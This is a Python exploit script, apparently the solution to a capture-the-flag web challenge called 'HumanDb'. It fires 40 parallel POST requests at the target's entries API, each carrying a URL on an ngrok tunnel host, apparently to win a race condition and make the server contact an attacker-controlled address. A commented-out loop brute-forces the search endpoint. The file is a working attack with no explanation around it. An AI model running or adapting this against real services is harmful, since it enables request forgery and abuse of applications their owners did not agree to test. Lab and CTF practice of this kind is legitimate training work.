#!/usr/bin/python3

from pwn import *
import requests
import sys
import string
from pprint import pprint
from multiprocessing import Process




uprr = string.ascii_uppercase


QUERIES = [x for x in uprr]

def def_handler(sig, frame):
    print("\n\n[*] Exiting...")
    exit(1)

signal.signal(signal.SIGINT, def_handler)


def sending_url(url):

    res = requests.post(url=url+"api/entries", json={
        "url": "http://dcea-2800-bf0-8267-bbe-16e1-60d7-8d63-f47c.ngrok.io/"
    })

    print(res.text)



def get_all_entries(base_url):
    sess = requests.session()
    x = sess.get(url=base_url+"entries/")
    print(x.headers)


def exploting_query_url(url, payload):

    sess = requests.session()
    res = sess.get(url=url+ f"api/entries/search?q={payload}").text

    if res != "{\"message\":\"Your search did not yield any results!\"}":
        print(f"payload: {payload} service =>  {res}")

def main():

    p = log.progress("Exploting HumanDb challenge\n")
    try:
        p.status("\t\t[*] Implementing a concurrence exploit\n\n\n")
        base_url = sys.argv[1]

        processes = list()

        for _ in range(40):
            processes.append(Process(target=sending_url, args=(base_url,)))

        for process in processes:
            process.start()

        for process in processes:
            process.join()
        print("\n\n")
        # for x in QUERIES:
        #    exploting_query_url(base_url, x)
    except Exception as e:
        print(f"Error by: {str(e)}")
        exit(1)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()


